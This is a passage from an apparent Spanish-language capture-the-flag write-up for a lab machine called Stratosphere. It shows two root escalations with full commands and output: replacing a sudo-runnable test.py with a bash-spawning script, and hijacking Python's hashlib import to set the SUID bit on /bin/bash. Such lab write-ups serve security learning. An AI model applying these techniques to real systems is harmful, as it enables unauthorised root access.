richard@stratosphere:~$ ls -l
total 12
drwxr-xr-x 2 richard richard 4096 Oct 18  2017 Desktop
-rwxr-x--- 1 root    richard 1507 Mar 19  2018 test.py
-r-------- 1 richard richard   33 Jul  6 14:03 user.txt
richard@stratosphere:~$ rm test.py
rm: remove write-protected regular file 'test.py'? y
richard@stratosphere:~$ ls
Desktop  user.txt
```

Lo siguiente que vamos a hacer es crear otro archivo `test.py` con este `contenido`, de modo que al ejecutarlo con python nos spawnee una `bash` como usuario `root`

```
import os

def abrir_terminal():
    os.system('/bin/bash')

if __name__ == "__main__":
    abrir_terminal()

```

Nos `convertimos` en usuario `root`

```
richard@stratosphere:~$ sudo /usr/bin/python /home/richard/test.py 
root@stratosphere:/home/richard# 
```

## Privilege Escalation (Second Method)

Vemos que se están usando `librerías` sin indicar un `path` para ellas

```
richard@stratosphere:~$ cat test.py 
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
```

`Imprimimos` el `path` de `python`, en este caso nos viene por defecto empezar a buscar las `librerías` en el `directorio actual`

```
richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/gtk-2.0']
```

Nos creamos en el `directorio actual` la librería` hashlib.py` con el siguiente `contenido`

```
import os

os.system('chmod u+s /bin/bash')
```

`Ejecutamos` el script

```
richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb

Traceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 7, in question
    md5 = hashlib.md5()
AttributeError: module 'hashlib' has no attribute 'md5'
```

`Comprobamos` que se haya `añadido` el `privilegio SUID` a la `bash`

```
richard@stratosphere:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

`Ejecutamos` la `bash` como el `propietario` y nos `convertimos` en `root`

```
richard@stratosphere:~$ bash -p
bash-5.0# whoami
root
```
